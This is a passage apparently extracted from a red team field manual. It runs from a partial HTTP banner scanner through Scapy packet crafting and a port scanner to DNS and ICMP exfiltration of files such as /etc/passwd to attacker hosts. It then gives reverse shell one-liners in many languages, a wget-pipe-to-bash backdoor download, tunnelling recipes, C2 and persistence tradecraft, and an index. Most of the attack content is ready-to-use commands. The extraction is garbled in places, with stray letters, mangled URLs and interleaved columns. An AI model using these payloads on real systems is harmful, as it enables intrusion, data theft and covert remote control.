 ips.append('%s.%s.%s.%d' % (octets[0],octets[1],octets[2],i))

print("\nScanning IPs: %s\n" % (ips))

for ip in ips:
 try:
   response = urlopen("http://{}:{}".format(ip, opts.port))
  headers[ip] = dict(response.info())

 except Exception as e:
   headers[ip] = "Error: " + str(e)
 time.sleep(float(opts.delay))

for header in headers:
 try:
   print("%s : %s" % (header,headers[header].get('server')))

 except:
  print("%s : %s" % (header,headers[header]))
                               S
                          SCAPY SETUP
                                          When TCP packets are crafted with
                                           Scapy, the underlying OS will not
iptables –A OUTPUT –p tcp –-tcp-flags    recognize the initial SYN packet and
RST RST –j DROP                            will reply with a RST packet. To
                                        mitigate this, set the following iptables
                                                            rule

                EXPRESSION                              DESCRIPTION
                                                Imports all scapy
from scapy.all import *
                                                      libraries
                                                List all available
ls()
                                                     protocols
lsc()                                        List all scapy functions
conf                                          Show/set scapy config
IP(src=RandIP())                             Generate random src IPs
                                               Generate random src
Ether(src=RandMAC())
                                                       MACs
ip=IP(src="<IP_ADDRESS>",dst="<IP_ADDRESS>") Specify IP parameters
tcp=TCP(dport=<PORT>)                        Specify TCP parameters
data="TCP data"                                Specify data portion
                                                Create IP()/TCP()
packet=ip/tcp/data
                                                       packet
                                                 Display packet
packet.show()
                                                  configuration
send(packet,count=1)                         Send 1 packet @ layer 3
                                             Send 2 packets @ layer
sendp(packet,count=2)
                                                          2
                                                Send faster using
sendpfast(packet)
                                                      tcpreply
                                               Send 1 packet & get
sr(packet)
                                                       replies
                                               Send only return 1st
sr1(packet)
                                                        reply
for i in range(0,1000):                           Send <packet> 1000
   send (<PACKET_VARIABLE>)                               times
                                                  Sniff 100 packets on
sniff(count=100,iface=”<INTERFACE_NAME>”)
                                                    given interface

                 SEND IPV6 ICMP MESSAGE
sr(IPv6(src="<IP_ADDRESS>", dst="<IP_ADDRESS>")/ICMP())

      UDP PACKET WITH SPECIFIC PAYLOAD
from scapy.all import *

ip=IP(src="<IP_ADDRESS>", dst="<IP_ADDRESS>")
u=UDP(dport=<PORT>, sport=<PORT>)
pay = "my UDP packet"
packet=ip/u/pay
packet.show()
wrpcap ("<OUTPUT_PATH>",packet) : write to pcap
send(packet)
                                NTP FUZZER
from scapy.all import *

packet=IP(src="<IP_ADDRESS>", dst="<IP_ADDRESS>")/UDP(dport=
<PORT>)/fuzz(NTP(version=4,mode=4))

send(packet)

                      SEND HTTP MESSAGE
from scapy.all import *

fileweb = open("web.txt",'r')
data = fileweb.read()

ip = IP(dst="<IP>")

SYN = ip/TCP(sport=RandNum(6000,7000),dport=80,flags="S",seq=4)
SYNACK = sr1(SYN)
ACK = ip/TCP(sport=SYNACK.dport, dport=80, flags="A",
seq=SYNACK.ack, ack=SYNACK.seq+1)/data

reply, error = sr(ACK)

print(reply.show())
                                 P
                      PERL PORT SCANNER
use strict;
use IO::Socket;

for(my $port=<START_PORT>;$port<<END_PORT>;$port++)
{
  my $remote=IO::Socket::INET->new( Proto=>"tcp",PeerAddr=>"
<TARGET_IP>",PeerPort=>$port);

    if($remote)
    {
      print "$port is open\n";
    };
}
T   T
                     T             T
     FTP THROUGH NON-INTERACTIVE
            WINDOWS SHELL
echo open <IP_ADDRESS> 21 > ftp.txt
echo <USERNAME> >> ftp.txt
echo <PASSWORD> >> ftp.txt
echo bin >> ftp.txt
echo GET <FILE_PATH> >> ftp.txt
echo bye >> ftp.txt
ftp –v -n -s:ftp.txt

             DNS TRANSFER ON LINUX
                                               On Victim:
       xxd -p secret > file.hex
                                          Hex encode the file to
                                             be transferred:
                                               On Victim:
       for b in `cat file.hex `; do dig
       $b.shell.evilexample.com; done     Read in each line and
                                           do a DNS lookup:
                                              On attacker:
       tcpdump -w /tmp/dns -s0 port
       53 and host
                                           Capture DNS exfil
       system.example.com
                                               packets:
       tcpdump -r dnsdemo -n | grep          On attacker:
       shell.evilexample.com | cut -f9
       -d' ' | cut -f1 -d'.' | uniq >      Cut the exfilled hex
       received.txt                       from the DNS packet:
       xxd -r -p < received.txt >            Reverse the hex
       keys.pgp                                 encoding:


       EXFIL COMMAND OUTPUT ON A
   LINUX MACHINE OVER ICMP
stringZ=`cat /etc/passwd | od -tx1 | cut -c8- |
tr -d " " | tr -d "\n"`; counter=0; while
(($counter <= ${#stringZ}));do ping -s 16 -c
                                                  On victim
1 -p ${stringZ:$counter:16} 192.168.10.10
&&
counter=$((counter+16));done
                                                      On
                                                   attacker
tcpdump -ntvvSxs 0 'icmp[0]=8' > data.dmp
                                                   (capture
                                                  packets to
grep 0x0020 data.dmp | cut -c21- | tr -d " " |
                                                  data.dmp
tr -d "\n" | xxd -r -p
                                                     and
                                                    parse):
   SENDING EMAIL FROM OPEN RELAY
             (TELNET)
telnet <IP_ADDRESS> 25
HELO
MAIL FROM:<EMAIL_ADDRESS>
RCPT TO: <EMAIL_ADDRESS>
DATA
Thank You.
.
quit
                      R                    S
                                 NETCAT
              Start listener on attack box to catch reverse shells
nc <IP_ADDRESS> <PORT> -e /bin/sh                           Linux reverse shell
                                                             Windows reverse
nc <IP_ADDRESS> <PORT> -e cmd.exe
                                                                   shell
                                                           Netcat work-around
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc
                                                            when –e option not
<IP_ADDRESS> <PORT> >/tmp/f
                                                                  possible


                                    PERL
perl -e ‘use Socket; $i="<IP_ADDRESS>"; $p=<PORT>;
socket(S,PF_INET, SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){              Perl
open(STDIN,">&S");open(STDOUT,">&S");
open(STDERR,">&S"); exec("/bin/sh -i");};’
perl -MIO -e '$p=fork;exit,if($p);$c=new                   Perl
IO::Socket::INET(PeerAddr,"<IP_ADDRESS>:<PORT>");STDIN- without
>fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'        /bin/sh
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"
                                                        Perl for
<IP_ADDRESS>:<PORT>");STDIN->fdopen($c,r);$~-
                                                        Windows
>fdopen($c,w);system$_ while<>;'


                                PYTHON
python -c ‘import socket,subprocess,os; s=socket.socket(socket.AF_INET,
socket.SOCK_STREAM); s.connect(("<IP_ADDRESS>",<PORT>));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-
i"]);’

                                   BASH
bash -i >& /dev/tcp/<IP_ADDRESS>/<PORT> 0>&1
                                                    JAVA
 r = Runtime.getRuntime()
 p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<IP_ADDRESS>/<PORT>;cat <&5 | while read line; do
 \$line 2>&5 >&5; done"] as String[])
 p.waitFor()

                                                    PHP
 php -r '$sock=fsockopen("<IP_ADDRESS>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");‘

                                                    RUBY
ruby -rsocket -e'f=TCPSocket.open("<IP_ADDRESS>",<PORT>).to_i; exec sprintf("/bin/sh -i
                                                                                                        Ruby
<&%d >&%d 2>&%d",f,f,f)'
                                                                                                     Ruby
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("<IP_ADDRESS>","
                                                                                                   without
<PORT>");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
                                                                                                    /bin/sh
ruby -rsocket -e 'c=TCPSocket.new("<IP_ADDRESS>","                                                 Ruby for
<PORT>");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'                              Windows


                                                   TELNET
telnet <IP_ADDRESS> <PORT> | /bin/bash | telnet <IP_ADDRESS> <PORT+1>                           Telnet


                                                   XTERM
xnest :1                                                        Start Listener (Listens on port 6001)
xhost +<IP_ADDRESS>                                                  Add permission to connect
xterm -display <IP_ADDRESS>                                                     Telnet


                       WGET SCRIPT DOWNLOAD & EXECUTE
 wget -O- http://<IP_ADDRESS>:<PORT>/backdoor.sh | bash
More info at:
                 ://               .       /   -     /      /        -      -         -
                ://                    .       .    /2011/09/        -       -    -       .
                ://    . /   0N0
                         T
                        FPIPE TUNNEL
                                     Listen on port 1234 and forward
fpipe.exe –l 1234 –r 80 2.2.2.2
                                           to 2.2.2.2 on port 80


                       SOCAT TUNNEL
                                                Listen on port 1234
socat TCP-LISTEN:1234,fork TCP:2.2.2.2:80      and forward to 2.2.2.2
                                                     on port 80


   SSL ENCAPSULATED NETCAT TUNNEL
              (STUNNEL)
openssl req -new -x509 -days 365 -          (Listening Server)
nodes -out stunnel.pem -keyout
stunnel.pem                             Generate SSL certificate
Modify /stunnel.conf
client = no                                 (Listening Server)
[netcat server]
accept = 4444                        Modify stunnel configuration
connect = 7777
cert = /etc/stunnel/stunnel.pem
                                            (Listening Server)
sudo stunnel ./stunnel.conf
                                               Run stunnel
Modify /stunnel.conf
client = yes                                   (Attacker)
[netcat client]
accept = 5555                        Modify stunnel configuration
connect = <LISTENING_IP>:4444
sudo stunnel ./stunnel.conf                    (Attacker)
                                                Run stunnel
                                             (Listening Server)
nc –vlp 7777
                                         Listen for netcat connection
                                                  (Attacker)

nc –nv 127.0.0.1 5555                 Connect into victim computer via
                                                   netcat


More info at: https://edzeame.wordpress.com/2014/06/23/setting-up-
stunnel-configurations/
T   C
            T                           C
This section outlines various tradecraft considerations that should be made
                   while operating in a live environment.

              ARTIFACT CREATION AND
                    UPLOADING
         Do created artifact names and configurations blend in
         with the target environment (service names, descriptions,
         file names, etc.)?
         Is the payload packed/obfuscated?
         Was the payload created matching target system
         architecture, C2 type, and payload type?
         Is the artifact uploaded to a non-descript location?

                PERSISTENCE ACTIONS
         Do I have the correct "permission" to execute this
         persistence method (administrator versus user
         persistence methods)?
         Once the persistence executes, is the payload process
         suspicious?
         After persistence executes, is the implant call back
         interval too fast or too slow?
         Should I log this persistence?


                  REMOTE EXECUTION
         Is the remote machine in scope?
         Is it normal to see this machine talk to the remote
         system?
         Do I hold the correct permission to remotely execute?
         Once the persistence executes, is the payload process
suspicious?
Should I remove the artifact after gaining persistence?
Should I log this remote execution?


      INFRASTRUCTURE SETUP
Purchase a VPS for C2 redirection.
SSL certs purchased and configured successfully on
redirector.
Age redirector as long as possible.
Redirector content uploaded and "categorized".
ProxyPass or similar traffic pass thru technique
configured to push implant traffic to team server.
Iptables configured to block unwanted traffic from
redirector and Red Team attack machine.
Passwords changed on redirector, and any other Red
Team owned machines.
SSH keys configured and password protected.
        TOKEN MANIPULATION
Is the correct privilege held to run this token
manipulation method?
Is the "domain" section of the technique set correctly?
Is the hash or password still valid (it could be expired)?
Does the user belong to any concerning groups (HBSS
admin, firewall admin, etc.)?
Is the user account enabled?
Has the user logged in recently?
Has the user authenticated from this machine before?
Is an active user credential required for this task?


      END OF DAY OPERATIONS
Revert all credentials in implant sessions (rev2self,
drop_token, etc.).
Exit any implants no longer needed for the operation.
Unlink from all SMB implants (beginning with outer
chain and working back).
Sleep down all HTTPS implants to a slower call back
interval (such as 4 hours).
Update any organizational logs with end of day
information.
 I
   8
802.11a, 87
802.11b/g, 87
802.11n, 87

   A
aircrack-ng, 90
aireplay-ng, 90
airmon-ng, 90
airodump –ng, 89
airodump-ng, 90
apt-get, 58
arecord, 67
arp, 20, 66, 107
arping, 107
ASCII Table, 112
at.exe, 38
   B
Bash, 123
Bash History, 68
Batch Scripts, 44, 45
Beef Hook, 91

   C
C Band, 87
Cellular, 87
chage, 59
Cisco, 84
crontab, 64
Curl, 92

   D
dd, 62, 63
df, 51, 58
dhclient, 89
diff, 62
dig, 61
DNS Transfer, 121
DNSRecon, 85
docker, 93
dos2unix, 62
dpkg, 58
dscacheutil, 52
dscl, 51, 52, 53
dsquery, 30, 31, 32

   E
Ettercap, 107
etterfilter, 107
Excel Password, 109
expand, 24, 30

   F
fdisk, 58, 68
file, 62
find, 23, 62
findmnt, 59
findstr, 23, 47
forfiles, 24, 45
FPipe, 125
Frequency, 87
fstab, 59
FTP, 121
   G
gcc, 67
Google Hacking, 10
GPS, 87
grep, 62
gzip, 63

   H
hciconfig, 89
hcitool, 89
host, 61
hostname, 51
hping3, 107
Hydra, 108

   I
id, 51, 59
ifconfig, 51, 60, 61, 77, 89
iframe, 92
init, 67
ipconfig, 20
iptables, 74, 75
IPv4, 81
IPV6, 83
iwconfig, 89
iwlist, 61
   J
Java, 124
John The Ripper, 108

    K
K Band, 87
Ka Band, 87
kill, 59, 68
killall, 59
Kismet, 88
Ku Band, 87

    L
last, 51, 59
ln, 68
logins, 77
lsof, 60
    M
makecab, 24, 30
md5sum, 63
mdk3, 90
Metasploit, 102
mimikatz, 46
mkdir, 52
mklink, 25
MMC COMObject, 26
mount, 51, 59, 67, 68
msfvenom, 103
MSSQL, 94
MySQL, 95
    N
nano, 64
ndiff, 98
net accounts, 29
net group, 29
net localgroup, 19, 29, 34
net session, 18, 22, 32
net share, 18, 34
net use, 22
net user, 29, 34, 94
net view, 22, 29, 47
Netcat, 101, 123
netsh, 20, 34
netstat, 20, 51, 60, 77
nmap, 97
Nmap, 106
NMap, 85
nohup, 67
nslookup, 20
NTP, 118

   O
office2john, 109
Oracle, 95

   P
passwd, 57, 59
password cracking, 108
PATH, 51, 67
People Search, 10
Perl, 119, 123
persistence, 37, 39, 64
Persistence, 37, 127
PHP, 124
Plist, 51
plutil, 51
Ports, 79, 80
POSTGRES, 94
Powershell, 41, 42, 43
Prefetch, 36
proxychains, 106
ps, 51, 59, 105
python, 114
Python, 113, 115, 116, 123

   R
rdesktop, 67
RDP, 33
REG ADD, 22
Regex Expressions, 111
Reverse DNS, 85
reverse shells, 123
RFID, 87
rfkill, 89
route, 20, 60, 77, 84, 102, 106
rpm, 58
rsumrf6, 83
Ruby, 124
Run Key, 37
runas, 19, 42
   S
sc, 19, 26, 39
Scada, 80
Scapy, 117
Scheduled Task, 37
schtasks.exe, 27, 37, 39
scp, 69
screen, 73
sdptool, 89
SendMail, 115
service, 76
Service creation, 39
set, 18
sha1sum, 63
shadow, 57
shred, 62
smbclient, 67
SNMP, 85
socat, 83
Socat, 125
socks4, 106
Solaris, 77
SQLMap, 93
SSH, 69
ssh –L, 70
ssh –R , 7, 70
ssh-keygen, 69
Startup Directories, 38
STunnel, 125
Subnet, 82
Subnetting, 81
sw_vers, 51
systemctl, 64, 76
systeminfo, 18, 22

   T
tar, 63
taskkill, 19
tasklist, 19, 22, 47
tcpdump, 71, 72
tcpkill, 61
Telnet, 124
top, 59
touch, 62
tradecraft, 127
tree.com, 24
Tunnel, 125
type, 20, 23, 62, 70, 75, 76, 88, 91, 93, 94, 99, 127
Type Conversions, 92

   U
umount, 68
uname, 51, 58
upx, 63
User Agent String, 91
useradd, 59
userdel, 59
usermod, 59

   V
VSS, 25
vssadmin, 25

   W
w, 51, 59
w32tm, 31
watch, 60
wc, 62
wevtutil, 32, 36
wget, 67
Wget, 92
WGET, 124
which, 58
who, 59
WHOIS, 9
Wi-Fi, 89
Wireshark, 99
WitnessMe, 93
wmic, 18, 19, 22, 25, 34, 46
wpa_supplicant, 89
WPA-PSK, 89
WptsExtensions, 40
   X
xcopy, 22
xsltproc, 98
XTerm, 124
   Z
ZigBee, 87
zip, 63
Zone Transfer, 61
